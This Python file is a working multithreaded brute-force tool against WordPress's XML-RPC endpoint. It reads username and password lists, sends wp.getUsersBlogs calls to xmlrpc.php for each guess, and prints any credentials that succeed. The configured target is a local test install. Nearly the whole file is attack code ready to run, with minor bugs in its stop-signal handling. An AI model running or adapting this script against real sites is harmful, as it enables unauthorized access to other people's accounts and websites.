import threading
from math import floor
import argparse
import signal
import os
import sys
import requests
import xml.etree.ElementTree as etree

workers = []
stop=0
globalEvent=threading.Event()
METHOD_NAME="wp.getUsersBlogs"

def planSocial():
    #os.kill(os.getpid(), signal.SIGUSR1)
    globalEvent.set()

def fermetureDefinitive(signum, stack):
    print("Signal received : "+signum)
    planSocial()
    stop=1

class BruteWorker(threading.Thread):
    def __init__(self, username, passwords, url, id):
        threading.Thread.__init__(self)
        self.username = username
        self.passwords = passwords
        self.url=url
        self.id=id
        #signal.signal(signal.SIGUSR1, self.stopThread)
        
    def run(self):
        for password in self.passwords:
            if globalEvent.is_set():
                break
            print(self.username, password, self.id)
            self.testThisShit(password)

    def _requestBuilder(username,password,methodName):
        methodCall=etree.Element("methodCall")
        methodNameElem=etree.SubElement(methodCall,"methodName")
        methodNameElem.text=methodName
        params=etree.SubElement(methodCall,"params")
        usernameElem=etree.SubElement(etree.SubElement(params, "param"), "value")
        usernameElem.text=username
        passwordElem=etree.SubElement(etree.SubElement(params, "param"), "value")
        passwordElem.text=password
        return methodCall

    def _responseParser(responseText):
        XMLresponse=etree.fromstring(responseText)
        found=XMLresponse.find("fault/value/struct")
        if found is None :
            print(responseText)
            return True
        return False
            

    def testThisShit(self, password):
        requestBuilt=BruteWorker._requestBuilder(self.username,password,METHOD_NAME)
        r=requests.post(self.url, data=etree.tostring(requestBuilt))
        isItGood=BruteWorker._responseParser(r.text)
        if isItGood:
            print("hohohooooooooooo "+self.username+" "+password)
            planSocial()
        #if password=="password" :
        #    print(etree.tostring(requestBuilt))
        #    print(r.text)

class Launcher:
    def __init__(self, path_usernames, path_wordlist, url, num_threads):
        self.usernames=Launcher._get_list(path_usernames)
        self.wordlist=Launcher._get_list(path_wordlist)
        self.url=url
        self.num_threads=num_threads
        self.lego()

    #Merci poto donvan https://stackoverflow.com/questions/29666126/how-to-load-a-word-list-into-python
    def _get_list(path):
        wordlist = list()

        with open(path) as f:
            for line in f:
                wordlist.append(line.rstrip('\n'))

            return wordlist

    def lego(self):
        nb_words=len(self.wordlist)
        interval=floor(nb_words/self.num_threads)
        for user in self.usernames:
            counter=0
            i=0
            while (interval*i)<nb_words :
                workers.append(BruteWorker(user, self.wordlist[(interval*i):(interval*(i+1))], self.url, str(i)))
                workers[i].start()
                i+=1
            for i in range(len(workers)):
                workers[i].join()
            workers.clear()
            globalEvent.clear()
            if stop == 1 :
                break
        print("À plus bg")

signal.signal(signal.SIGINT, fermetureDefinitive)
tropbien = Launcher("/home/chapavoler/xml_rpc_exploit/usernames_list","/home/chapavoler/xml_rpc_exploit/password_list","http://localhost/wordpress/xmlrpc.php",10)